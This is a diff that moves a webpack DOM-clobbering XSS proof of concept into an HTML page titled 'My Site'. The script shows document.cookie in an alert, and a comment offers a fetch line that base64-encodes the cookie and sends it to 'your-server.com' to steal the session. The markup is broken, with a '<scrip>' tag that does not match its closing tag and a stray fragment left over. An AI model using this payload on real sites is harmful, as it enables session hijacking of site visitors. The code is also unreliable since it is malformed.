@@ -1,5 +1,12 @@
-// 1. Your malicious XSS payload executes immediately when the script loads
-alert('DOM Clobbered Webpack XSS! Document Cookie: ' + document.cookie);
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Site</title>
+</head>
+<body>
+    <scrip>
+  alert('DOM Clobbered Webpack XSS! Document Cookie: ' + document.cookie);
 
 // You can replace the alert with a payload to steal the session or perform actions:
 // fetch('https://your-server.com/log?cookie=' + btoa(document.cookie));
@@ -14,4 +21,8 @@ alert('DOM Clobbered Webpack XSS! Document Cookie: ' + document.cookie);
       console.log("Malicious chunk loaded seamlessly.");
     }
   }
+
 ]);
+  </script>
+</body>
+</html>
